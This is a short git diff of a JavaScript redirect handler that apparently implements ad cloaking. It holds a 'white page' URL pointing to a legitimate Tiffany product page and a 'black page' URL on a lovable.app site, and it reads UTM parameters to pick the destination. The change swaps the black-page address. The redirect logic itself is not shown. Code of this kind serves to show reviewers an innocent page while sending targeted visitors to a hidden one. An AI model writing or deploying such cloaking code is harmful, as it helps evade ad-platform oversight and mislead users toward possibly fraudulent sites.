@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.tiffany.com/home-accessories/personal-accessories/return-to-tiffany-sterling-silver-personal-accessories-60559457.html";
-    const blackPageURL = "https://streammagic.lovable.app/";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
